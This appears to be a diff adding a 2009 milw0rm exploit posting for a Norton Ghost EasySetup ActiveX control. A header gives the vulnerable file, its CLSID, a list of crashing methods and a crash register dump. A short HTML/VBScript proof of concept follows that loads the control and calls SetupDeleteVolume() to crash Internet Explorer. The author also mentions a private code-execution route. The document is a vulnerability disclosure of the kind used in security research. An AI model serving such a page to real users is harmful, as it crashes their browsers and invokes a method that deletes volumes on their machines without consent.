@@ -1,0 +1,70 @@
+-----------------------------------------------------------------------------------------
+ Norton Ghost Support module for EasySetup wizard Remote DoS/Arbitrary code execution(?)
+ url: http://www.symantec.com/
+
+ Author: shinnai
+ mail: shinnai[at]autistici[dot]org
+ site: http://www.shinnai.net/
+
+ File:      EasySetupInt.dll
+ Ver.:      14.0.4.30167
+ ProgID:    Symantec.EasySetup.1
+ Descr.:    CEasySetup Object - Support module for EasySetup wizard
+ 
+ Marked as: RegKey Safe for Script: True
+            RegKey Safe for Init: True
+            Implements IObjectSafety: False
+            KillBitSet: False
+
+ Bug info:  This component contains methods which lead into a denial of
+            service.
+            This is the list of components:
+
+            "GetBackupLocationPath"
+            "CallUninstall"
+            "SetupDeleteVolume"
+            "CanUseEasySetup"
+            "CallAddInitialProtection"
+            "CallTour"
+
+            Crash happens here:
+
+            03A6B9D6   8B10             MOV EDX,DWORD PTR DS:[EAX]
+
+            And registers risuation is:
+           
+            EAX 00000000
+            ECX 774F9997 ole32.774F9997
+            EDX 019DCB04
+            EBX 00000000
+            ESP 019DCAE4
+            EBP 019DCB9C
+            ESI 019DCCB8
+            EDI 00000001
+            EIP 03A6B9D6 EasySetu.03A6B9D6
+
+            Unfortunately the vulnerability seems to be unexploitable, anyway
+            I've found a way to execute arbitrary code but it's useless 
+            because requires a high level of user interaction to work.
+            That's why it will remain private.
+            I hope that someone else will be able to exploit this vuln
+            using more convenient ways.
+
+            Peace            
+
+ This was written for educational purpose. Use it at your own risk.
+ Author will be not responsible for any damage.
+
+ Tested on Windows XP Professional SP3 with Internet Explorer 7
+-----------------------------------------------------------------------------------------
+<object classid='clsid:7972D5BE-2213-4B28-884C-F8F82432EAA5' id='test'></object>
+
+<input language=VBScript onclick=tryMe() type=button value='Click here to start the test'>
+
+<script language='vbscript'>
+ Sub tryMe
+  test.SetupDeleteVolume()
+ End Sub
+</script>
+
+# milw0rm.com [2009-04-23]
